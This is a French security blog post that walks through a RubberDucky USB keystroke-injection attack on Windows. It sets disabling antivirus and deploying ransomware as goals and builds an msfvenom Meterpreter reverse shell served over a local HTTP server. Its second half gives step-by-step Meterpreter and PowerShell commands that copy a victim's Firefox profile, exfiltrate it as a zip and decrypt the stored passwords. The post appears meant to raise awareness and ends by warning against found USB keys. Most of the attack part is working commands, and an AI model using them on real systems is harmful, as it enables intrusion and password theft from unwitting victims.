+++
date = "2020-03-23T10:27:00+00:00"
draft = false
tags = ['securité']
title = "RubberDucky"
author = "claw"
+++

## RubberDucky {#rubberducky}


### Fonctionnement


Il ressemble à une clef usb d'apparence anodine mais il s'agit en réalité d'un clavier scripté capable de taper plus de 1000mots par minute.
Il contient une carte mémoire qui contient notre script et marche très bien sur tout OS même à jour.

![](/img/sec/ducky.png)

### Objectifs

- désactiver les antivirus |
- configurer un proxy |
- démarrer un reverse shell |
- insertion de certificat d'autorité |
- démarrer des scripts powershell |
- tels qu'un ransomware |


Exemple de script RubberDucky:

```text
DELAY 700                        // Attendre 700 ms
ESCAPE                           // Tapper Echap
DELAY 100                        // Attendre 100ms
CONTROL ESCAPE                   // Ouvrir le menu Démarer
DELAY 100
STRING Windows Security          // Tapper "Windows Security"
DELAY 200
...
```

### Compilation

![](/img/sec/comp.png)

Le compilateur est fournit en .jar c'est du java compilé et packagé:

- `-i` l'input
- `-l` l'output (doit toujours être inject.bin)
- le plus important `-l` pour le langage du clavier


### Reverse shell

![](/img/sec/msfv.png)

Un reverse shell est un programme qui permet d'obtenir un accès distant pour exécuter des commandes.
Le but est de l'exécuter sur la machine de la victime pour qu'il se connecte a un shell qu'on a mit en écoute de connections sur un serveur.

On utilise Msfvenom pour créer le payload et Metasploit pour le serveur Meterpreter (c'est sur celui ci que la victime va se connecter:
- `-a`: l'architecture CPU
- `--platform`: la plateforme (windows, android, nix...)
- `-p`: Le paylaod, dans ce cas meterpreter reverse_tcp
- `LHOST`: l'ip du serveur meterpreter
- `LPORT`: le port du server meterpreter
- `-e`: l'encoding
- `-f`: le format
- `>` /tmp/mad/666.exe: la destination

### Distribution

```bash
cd /tmp/mad && python -m http.server
# Sous ubuntu, debian... il faut utiliser python3 -m http.server
# car python = python2 sous ArchLinux python = python3
```

Une fois prêt on utilise un petit serveur http pour que la victime puisse télécharger notre exe malveillante.

![](/img/sec/msf.png)


### Demo

[![](/img/sec/demoloosedoz.png)](https://yourlabs.io/oss/security/raw/master/assets/ducky-windoz.mp4)

[![](/img/sec/revshell.png)](https://yourlabs.io/oss/security/raw/master/assets/msf-reverseshell.mp4)

(clické sur les images pour voir les videos)

#### Conclusion:

Ne ramassez pas les clefs usb que vous trouvez dans la rue

---

## Reverse shell

### Usages

- Vol de mots de passe firefox
- Keylogger
- Screen capture
- Downloader et uploader des fichiers
- Implémentation d'un ransomeware
- Reconnaissance et mouvement transversaux dans le réseau
- ...


### Vol de mots de passe Firefox

```powershell
meterpreter > shell
> powershell
> cd /users/<user> #(utilisez whoami pr le savoir)
> copy-item /users/33768/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release -destination /windows/temp/mad.default-release -recurse
> Compress-Archive -Path /windows/temp/mad.default-release -DestinationPath /windows/temp/mad.default-release.zip
> exit
> exit
meterpreter > Download /windows/temp/mad.default-release.zip /tmp
```

- [1] Lancer cmd)
- [2] Lancer powershell)
- [3] Copie des fichiers .default-release de firefox
- [4] Compression dans fichiers dans une archive zip
- [5-6] On exit 2 fois pour revenir au prompt `meterpreter >`
- [7] Exifltration de l'archive zip


### Extraction

Dans un autre terminal, on unzip et place les fichier dans le répertoire ~/.mozila/firefox

```bash
$ unzip mad.default-release.zip
$ sudo cp -r mad.default-release /home/<you>/.mozilla/firefox
$ sudo chown -R ${USER}. /home/<you>/.mozilla/firefox/mad.default-release
```

### Configuration

Par la suite on édite `~/.mozilla/firefox/profiles.ini avec le nouveau profile`

```text
[Profile2]
Name=default-release
IsRelative=1
Path=mad.default-release
```

### Déchiffrement

On utilise un outil appelé "[firefox-decrypt](https://github.com/Unode/firefox_decrypt/)":

```bash
$ git clone https://github.com/unode/firefox_decrypt.git
$ cd firefox_decrypt
$ python firefox_decrypt.py
```


### Resultat

![](/img/sec/password.png)


- [Partie 2: Ransomware](/posts/2020-03-24-windows_ransomware/)
- [Partie 3: SSL mitm](/posts/2020-03-24-ssl_mitm/)
